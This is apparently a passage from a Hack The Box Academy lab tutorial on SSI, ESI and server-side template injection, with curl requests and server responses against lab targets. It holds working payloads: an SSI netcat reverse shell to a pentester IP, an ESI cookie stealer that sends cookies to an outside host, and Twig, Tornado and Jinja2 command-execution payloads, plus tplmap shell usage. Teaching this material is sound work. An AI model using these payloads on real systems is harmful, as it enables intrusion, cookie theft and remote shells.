Let us focus on identifying an SSI Injection vulnerability by submitting some of the SSI directives mentioned in the previous section.

```html
1. <!--#echo var="DATE_LOCAL" -->
2. <!--#printenv -->

```

#### Date

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png)

#### All Variables

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png)

As we can see, the application is indeed vulnerable to SSI Injection!
Now, proceed to the exercise at the end of this section and leverage any SSI directives listed in the previous section that can result in command execution against the underlying system to complete it.

**Note:** As we saw, running OS commands via SSI on the target application is possible, but who doesn't love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn't include the execute functionality by default. Also note that you won't be able to obtain a reverse shell in this section's exercise, due to network restrictions!

#### Reverse Shell

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

```

- `mkfifo /tmp/foo`: Create a FIFO special file in `/tmp/foo`
- `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
- `| bin/bash 1>/tmp/foo`: Execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo`
- `rm /tmp/foo`: Cleanup the FIFO file


# Edge-Side Includes (ESI)

* * *

Edge Side Includes ( `ESI`) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge Side Includes (ESI) allow for dynamic web content assembly at the edge of the network (Content Delivery Network, User's Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).

ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.

Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.

Although we can identify the use of ESI by inspecting response headers in search for `Surrogate-Control: content="ESI/1.0"`, we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:

#### ESI Tags

```html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>

```

In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, we can pass `dca=xslt` to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:

- Includes: Supports the `<esi:includes>` directive
- Vars: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
- Cookie: Document cookies are accessible to the ESI engine
- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

| **Software** | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :-: | :-: | :-: | :-: | :-: | :-: |
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No | No |
| NodeJS esi | Yes | Yes | Yes | No | No |
| NodeJS nodesi | Yes | No | No | No | Optional |


# Introduction to Template Engines

* * *

Template engines read tokenized strings from template documents and produce rendered strings with actual values in the output document. Templates are commonly used as an intermediary format by web developers to create dynamic website content. Server-Side Template Injection ( `SSTI`) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template.

Below you will find some applications that you can run locally to better understand templates. If you are unable to do so, do not worry. The following sections feature exercises with various applications utilizing templates.

Let us now consider the following documents:

#### app.py

```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)

```

#### index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>{{title}}</h1>
    <p>{{content}}</p>
</body>
</html>

```

When we visit the website, we will receive an HTML page containing the values of the `title` and `content` variables evaluated inside the double brackets on the template page. Pretty straightforward, and as we can see, the user does not have any control over the variables. What happens when user input enters a template without any validation, though?

#### app.py

```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

@app.route("/hello", methods=['GET'])
def hello():
	name = request.args.get("name")
	if name == None:
		return redirect(f'{url_for("hello")}?name=guest')
	htmldoc = f"""
	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you {name}</a>
	</body>
	</html>
	"""
	return render_template_string(htmldoc)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)

```

In this case, we can inject a template expression directly, and the server will evaluate it. This is a security issue that could lead to remote code execution on the target application, as we will see in the following sections.

#### cURL - Interacting with the Target

```shell
curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/2.0.2 Python/3.9.7
Date: Mon, 25 Oct 2021 00:12:40 GMT

	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you 49</a> # <-- Expresion evaluated
	</body>
	</html>

```


# SSTI Identification

* * *

We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).

The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:

```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
...

```

We will look for "49" in the response when injecting these payloads to identify that server-side evaluation occurred.

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include `${{<%[%'"}}%\`. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.

We can use tools such as [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.

The diagram below from [PortsSwigger](https://portswigger.net/research/server-side-template-injection) can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine.

![image](https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png)

In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with:

- Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
- Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
- Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.


# SSTI Exploitation Example 1

* * *

Suppose that we are pentesting an internet-facing application (the target can be spawned at the end of this section). Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you will come across the application below.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig1.png)

Let us submit on the input field mathematical expressions in curly brackets, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig2.png)

It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig3.png)

It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?

![image](https://academy.hackthebox.com/storage/modules/145/img/twig6.png)

Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Let's use PortSwigger's diagram to assist us (shown in the previous section). We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig_.png)

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine.

There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one:

```php
{{_self.env.display("TEST")}}

```

![image](https://academy.hackthebox.com/storage/modules/145/img/twig7.png)

The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. For an extensive list of template engine-specific payloads, please refer to the following resources:

- [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)


We could have automated the template engine identification process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows. If you didn't notice, the user's input is submitted via the `name` parameter and through a POST request (hence the `-d` parameter in `tplmap`).

#### tplmap.py

```shell
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install virtualenv
virtualenv -p python2 venv
source venv/bin/activate
pip install -r requirements.txt
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john

  Capabilities:

   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files

```

The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable `_self`, which, in simple terms, makes a few of the internal APIs public. This `_self` object has been documented, so we don't need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the `getFilter` function as it allows execution of a user-defined function via the following process:

- Register a function as a filter callback via `registerUndefinedFilterCallback`

- Invoke `_self.env.getFilter()` to execute the function we have just registered


#### Payload

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}

```

Let's submit the payload using cURL this time.

#### cURL - Interacting with the Target

```shell
curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>

```

As we can see in the output/response above, the submitted payload was evaluated, and the specified commands ( `id`, `uname -a`, and `hostname`) were executed successfully.

Again, we could have automated the template engine exploitation process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows.

#### tplmap.py - OS Shell

./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell

```

We can now execute any command of our choosing through the shell `tplmap` established for us!

Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.

**Note:** When we notice that the mathematical expressions we submit are evaluated, the application may be vulnerable to XSS as well.

Let us test the above statement by submitting an XSS payload inside curly brackets to this section's exercise target. The result of doing so can be seen in the image below.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig8.png)


# SSTI Exploitation Example 2

* * *

Suppose we are tasked with pentesting yet another internet-facing application. Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you should come across the application below.

![image](https://academy.hackthebox.com/storage/modules/145/img/tornado1.png)

If you inspect the application's traffic using Firefox's Web Developer Tools ( `[Ctrl]` + `[Shift]` + `[I]`), you will notice that user input is submitted inside a parameter called `email` and through a POST request to `http://<TARGET IP>:<PORT>/jointheteam`

Let's submit mathematical expressions in curly brackets to the input field, such as the ones mentioned in the `SSTI Identification` section, starting with `${7*7}`, as PortSwigger's diagram suggests.

#### cURL - Interacting with the Target

```shell
curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email ${7*7} has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

It doesn't look like the application evaluated the submitted expression. Let's try `{{7*7}}`

#### cURL - Interacting with the Target

```shell
curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

The application evaluated the submitted expression this time. Let's continue, as PortSwigger's diagram suggests, to identify the underlying template engine.

#### cURL - Interacting with the Target

```shell
curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

The application evaluated the latest expression we submitted. So, according to the diagram, we should be dealing with a Twig or Jinja2 template engine, right?

Unfortunately, this is not the case! If we submit any Twig or Jinja2-specific payload, the application returns `500: Internal Server Error`. Find some examples of this behavior below.

```shell
curl -X POST -d 'email={{_self.env.display("TEST")}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

```shell
curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

```shell
curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam

<html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>

```

The payloads we utilized (and more) can be found on [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) and [HackTricks- SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

It should be straightforward now that no methodology is bulletproof. We could compile a list of template engine-specific payloads from the abovementioned resources and fuzz the application until we conclude on the template engine being used.

Eventually, when submitting [Tornado](https://www.tornadoweb.org/en/stable/guide/templates.html)-specific payloads, we will come across the below.

```shell
curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam

<html>
<head>
<style>
form {
margin: 0 auto;
width: 200;
}
</style>
</head>
<body>
<h1 style="text-align: center;">~ Damn Hackers ~</h1>
<h2 style="text-align: center;">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2>
<h2 style="text-align: center;"><em>Great!</em></h2>
<h3 style="text-align: center;"><em>Email 0 has been subscribed. You&#39;ll hear from us soon!</em></h3>
</body>

```

It seems we finally got it! Tornado is being utilized on the backend.

As already mentioned in previous sections, `tplmap` can be used to automate both the template engine identification and exploitation process.

#### tplmap.py

```shell
./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah

Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.


# SSTI Exploitation Example 3

* * *

Let's check the last application in the SSTI series. Once again, our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you should come across the application below.

![image](https://academy.hackthebox.com/storage/modules/145/img/jinja1.png)

User input is submitted via the `cmd` parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`.

#### cURL - Interacting with the Target

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"

<!DOCTYPE html>

```

It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time.

```shell
curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'

<!DOCTYPE html>

```

It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"

<!DOCTYPE html>
<html lang="en">

```

Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the `SSTI Identification`. We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds.

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;

		width: 200px;

	}
	#command:active {
        width: auto;
    }

```

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7\*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.

We could have automated the template engine identification process we just executed through `tplmap`, as follows.

#### tplmap.py

```shell
./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'

    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files

```

The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI.

* * *

## Python Primer for SSTI

Below is a small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:

| **No.** | **Methods** | **Description** |
| --- | --- | --- |
| 1. | `__class__` | Returns the object (class) to which the type belongs |
| 2. | `__mro__` | Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. |
| 3. | `__subclasses__` | Each new class retains references to subclasses, and this method returns a list of references that are still available in the class |
| 4. | `__builtins__` | Returns the builtin methods included in a function |
| 5. | `__globals__` | A reference to a dictionary that contains global variables for a function |
| 6. | `__base__` | Returns the base class inherited by the object <-- (\_\_ base\_\_ and \_\_ mro\_\_ are used to find the base class) |
| 7. | `__init__` | Class initialization method |

Start by running Python on Pwnbox's or a local VM's terminal, then follow along.

#### Python 3 Interpreter

```shell
python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>

```

Create a string object and use `type` and `__class__`, as follows. Then use the `dir()` command to show all methods and attributes from the object.

```python
>>> import flask
>>> s = 'HTB'
>>> type(s)

<class 'str'>

>>> s.__class__

<class 'str'>

>>> dir(s)

['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

```

The next step is to understand Python's hierarchy. Using `__mro__` or `mro()`, we can go back up the tree of inherited objects in the Python environment. Let's practice this as follows.

```python
>>> s.__class__.__class__

<class 'type'>

>>> s.__class__.__base__

<class 'object'>

>>> s.__class__.__base__.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>


>>> s.__class__.mro()[1].__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>

```

Now, let us look for useful classes that can facilitate remote code execution.

```python
>>> x = s.__class__.mro()[1].__subclasses__()
>>> for i in range(len(x)):print(i, x[i].__name__)
...
0 type
1 weakref
2 weakcallableproxy
3 weakproxy
4 int
5 bytearray
6 bytes
7 list
8 NoneType
<SNIP>

>>> def searchfunc(name):
...     x = s.__class__.mro()[1].__subclasses__()
...     for i in range(len(x)):
...             fn = x[i].__name__
...             if fn.find(name) > -1:
...                     print(i, fn)
...
>>> searchfunc('warning')

215 catch_warnings

```

Why are we searching for `warning` you may ask. We chose this class because it imports Python's [sys module](https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3) , and from `sys`, the `os` module can be reached. More precisely, os modules are all from `warnings.catch_`.

Please note that you will probably come across a different number. Back to our Python for SSTI specifics, we have seen that `catch_warnings` is present without importing any additional module to our Python console. Let's enumerate the builtins from this class as follows.

```python
>>> y = x[215]
>>> y

<class 'warnings.catch_warnings'>

>>> y()._module.__builtins__

{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>,
 <SNIP>

>>> z = y()._module.__builtins__
>>> for i in z:
...     if i.find('import') >-1:
...             print(i, z[i])
...
__import__ <built-in function __import__>

```

It seems we have reached the import function by walking the hierarchy. This means we can load `os` and use the `system` function to execute code all coming from a string object, as follows.

```python
>>> ''.__class__.__mro__[1].__subclasses__()

[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
RCE from a string object
0

```

Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.

Payload:

```python
{{ ''.__class__ }}

```

#### Curl - Interacting with the Target

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>&lt;class &#39;str&#39;&gt;</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>

```

#### Payload

```python
{{ ''.__class__.__mro__ }}

```

#### Curl - Interacting with the Target

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>

```

We are interested in the second item, so the payload should become:

```python
{{ ''.__class__.__mro__[1] }}

```

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>&lt;class &#39;object&#39;&gt;</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>

```

Let us start walking down the hierarchy, as follows.

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}

```

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">

```

As you can see in the application's response, `catch_warnings` is located at index #214.

We have everything we need to construct an RCE payload, such as the following.

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}

```

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>0</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>

```

The application returns `0` in its response. This is the return of the value of the command we just executed. `0` indicates that the command was executed without errors.

We can identify if `test1` was created using the following payload.

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}

```

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>test1
tmpv4tucw2b
</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>

```

Now that we have gone through the payload development process, it's worth mentioning that we can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are `request` and `lipsum`. Feel free to submit them to this section's target.

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

```

```python
{{lipsum.__globals__.os.popen('id').read()}}

```

A reverse shell can also be established through a payload such as the below.

```python
